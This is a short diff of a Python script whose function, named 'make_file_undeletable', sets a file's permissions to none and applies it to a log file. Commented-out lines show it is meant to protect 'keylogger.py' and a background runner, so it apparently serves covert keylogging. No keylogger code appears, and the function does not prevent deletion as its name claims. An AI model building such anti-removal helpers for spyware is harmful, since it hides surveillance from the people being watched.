@@ -1,20 +1,26 @@
 import os
+# import keylogger
+# import background_runner
+# import test
+# import test1
 
 def make_file_undeletable(filepath):
     try:
-        os.chmod(filepath, 0o755)
-        print(f"Permissions for '{filepath}' set to .py (0o755).")
+        os.chmod(filepath, 0o000) # Set permissions to 0o000 (no permissions)
+        print(f"Permissions for '{filepath}' set to 0o000 (no permissions).")
     except OSError as e:
         print(f"Error setting permissions for '{filepath}': {e}")
 
-
-file_to_protect = "test_log.txt"
-
-make_file_undeletable(file_to_protect)
-
-try:
-    os.remove(file_to_protect)
-    print(f"'{file_to_protect}' was deleted.")
-except OSError as e:
-    print(f"Could not delete '{file_to_protect}': {e}")
-
+if __name__ == "__main__":
+    make_file_undeletable("logs.txt")
+    # make_file_undeletable("background_runner.py")
+    # make_file_undeletable("keylogger.py")
+    # make_file_undeletable("test.py")
+    # make_file_undeletable("test1.py")
+    
+    
+    
+    
+    
+    
+# Failed can't ,ake file unreadble 
